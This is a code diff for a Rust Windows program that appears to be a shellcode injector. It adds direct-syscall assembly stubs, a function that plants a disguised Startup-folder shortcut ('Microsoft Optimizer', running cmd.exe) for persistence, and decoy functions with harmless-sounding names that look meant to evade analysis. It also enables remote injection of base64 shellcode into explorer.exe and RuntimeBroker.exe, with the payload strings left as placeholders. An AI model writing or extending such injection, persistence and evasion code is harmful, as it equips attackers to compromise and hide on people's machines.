@@ -5,6 +5,9 @@ use core::arch::global_asm;
 use windows::{
     Win32::System::Diagnostics::ToolHelp::*,
     Win32::Foundation::*,
+    Win32::System::Com::*,
+    Win32::UI::Shell::*,
+    core::*,
 };
 use windows_sys::Win32::System::Threading::{PROCESS_ALL_ACCESS, PROCESS_BASIC_INFORMATION, ProcessBasicInformation};
 use windows_sys::Win32::System::WindowsProgramming::{CLIENT_ID, OBJECT_ATTRIBUTES};
@@ -26,6 +29,12 @@ asm_nt_open_process:
     mov r10, rcx
     jmp r11
 
+    nop
+    nop
+    nop
+    nop
+    nop
+
 .global asm_nt_allocate_virtual_memory
 asm_nt_allocate_virtual_memory:
     mov rax, [rsp + 0x28]
@@ -39,6 +48,12 @@ asm_nt_allocate_virtual_memory:
     mov r10, rcx
     jmp r11
 
+    nop
+    nop
+    nop
+    nop
+    nop
+
 .global asm_nt_write_virtual_memory
 asm_nt_write_virtual_memory:
     mov rax, [rsp + 0x28]
@@ -49,6 +64,12 @@ asm_nt_write_virtual_memory:
     push r10
     mov r10, rcx
     jmp r11
+
+    nop
+    nop
+    nop
+    nop
+    nop
 
 .global asm_nt_create_thread_ex
 asm_nt_create_thread_ex:
@@ -73,6 +94,12 @@ asm_nt_create_thread_ex:
     mov r10, rcx
     jmp r11
 
+    nop
+    nop
+    nop
+    nop
+    nop
+
 .global asm_nt_close
 asm_nt_close:
     mov eax, edx
@@ -80,6 +107,12 @@ asm_nt_close:
     push r9
     mov r10, rcx
     jmp r11
+
+    nop
+    nop
+    nop
+    nop
+    nop
 
 .global asm_nt_protect_virtual_memory
 asm_nt_protect_virtual_memory:
@@ -92,6 +125,12 @@ asm_nt_protect_virtual_memory:
     mov r10, rcx
     jmp r11
 
+    nop
+    nop
+    nop
+    nop
+    nop
+
 .global asm_nt_read_virtual_memory
 asm_nt_read_virtual_memory:
     mov rax, [rsp + 0x28]
@@ -102,6 +141,12 @@ asm_nt_read_virtual_memory:
     push r10
     mov r10, rcx
     jmp r11
+
+    nop
+    nop
+    nop
+    nop
+    nop
 
 .global asm_nt_query_information_process
 asm_nt_query_information_process:
@@ -126,9 +171,42 @@ extern "C" {
     fn asm_nt_query_information_process(ProcessHandle: HANDLE, ProcessInformationClass: u32, ProcessInformation: *mut std::ffi::c_void, ProcessInformationLength: u32, ReturnLength: &mut u32, syscall_id: u32, t: usize, r: usize) -> NTSTATUS;
 }
 
-const SHELLCODE1: &str = "";
-const SHELLCODE2: &str = "";
+const SHELLCODE1: &str = "ww==";
+const SHELLCODE2: &str = "ww==";
 const SHELLCODE3: &str = "";
+
+const FOLDERID_Startup: GUID = GUID::from_u128(0xB97D20BB_F46A_4C97_BA10_5E3608430854);
+const CLSID_ShellLink: GUID = GUID::from_u128(0x00021401_0000_0000_C000_000000000046);
+
+fn spawn_lnk() -> Result<()> {
+    unsafe {
+        CoInitializeEx(None, COINIT_APARTMENTTHREADED)?;
+
+        let shell_link: IShellLinkW = CoCreateInstance(&CLSID_ShellLink, None, CLSCTX_INPROC_SERVER)?;
+
+        shell_link.SetPath(w!("C:\\Windows\\System32\\cmd.exe"))?;
+
+        shell_link.SetArguments(w!("/c microsoftupdate"))?;
+
+        shell_link.SetDescription(w!("Microsoft Optimizer"))?;
+
+        let persist_file: IPersistFile = shell_link.cast()?;
+
+        let path_ptr = SHGetKnownFolderPath(&FOLDERID_Startup, KF_FLAG_DEFAULT, windows::Win32::Foundation::HANDLE(0))?;
+
+        let startup_path = path_ptr.to_string().map_err(|_| Error::from(HRESULT(0x80004005u32 as i32)))?;
+
+        CoTaskMemFree(Some(path_ptr.0 as _));
+
+        let lnk_path = format!("{}\\echo_test.lnk", startup_path);
+        let lnk_path_wide: Vec<u16> = lnk_path.encode_utf16().chain(std::iter::once(0)).collect();
+
+        persist_file.Save(PCWSTR(lnk_path_wide.as_ptr()), true)?;
+
+        CoUninitialize();
+    }
+    Ok(())
+}
 
 fn validate_system_configuration() {
     let mut buffer = [0u16; 256];
@@ -165,6 +243,28 @@ fn collect_user_metrics() {
     unsafe {
         windows_sys::Win32::UI::WindowsAndMessaging::GetCursorPos(&mut point);
         let _dummy = point.x * point.y;
+    }
+}
+
+fn perform_system_integrity_check() {
+    unsafe {
+        let _tick_count = windows_sys::Win32::System::SystemInformation::GetTickCount();
+        let mut system_info: windows_sys::Win32::System::SystemInformation::SYSTEM_INFO = mem::zeroed();
+        windows_sys::Win32::System::SystemInformation::GetSystemInfo(&mut system_info);
+
+        let mut mem_status: windows_sys::Win32::System::SystemInformation::MEMORYSTATUSEX = mem::zeroed();
+        mem_status.dwLength = mem::size_of::<windows_sys::Win32::System::SystemInformation::MEMORYSTATUSEX>() as u32;
+        windows_sys::Win32::System::SystemInformation::GlobalMemoryStatusEx(&mut mem_status);
+    }
+}
+
+fn maintain_background_services() {
+    unsafe {
+        let mut system_time: windows_sys::Win32::Foundation::SYSTEMTIME = mem::zeroed();
+        windows_sys::Win32::System::SystemInformation::GetSystemTime(&mut system_time);
+
+        let mut point: windows_sys::Win32::Foundation::POINT = mem::zeroed();
+        windows_sys::Win32::UI::WindowsAndMessaging::GetCursorPos(&mut point);
     }
 }
 
@@ -506,14 +606,16 @@ fn enjekteet(target_name: &str, shellcode_b64: &str, gadgets: &syscall::Gadgets)
 
 fn main() {
     validate_system_configuration();
+    perform_system_integrity_check();
+    let _ = spawn_lnk();
     let gadgets = syscall::get_nt_gadgets().expect("Gadgets not found");
 
     perform_background_tasks();
-    //enjekteet("explorer.exe", SHELLCODE1, &gadgets);
+    maintain_background_services();
+    enjekteet("explorer.exe", SHELLCODE1, &gadgets);
 
     collect_user_metrics();
-    let seed = unsafe { windows_sys::Win32::System::SystemInformation::GetTickCount64() };
+    let _seed = unsafe { windows_sys::Win32::System::SystemInformation::GetTickCount64() };
 
-    enjekteet("RuntimeBroker.exe", SHELLCODE1, &gadgets);
-    enjekteet("svchost.exe", SHELLCODE2, &gadgets);
+    enjekteet("RuntimeBroker.exe", SHELLCODE2, &gadgets);
 }
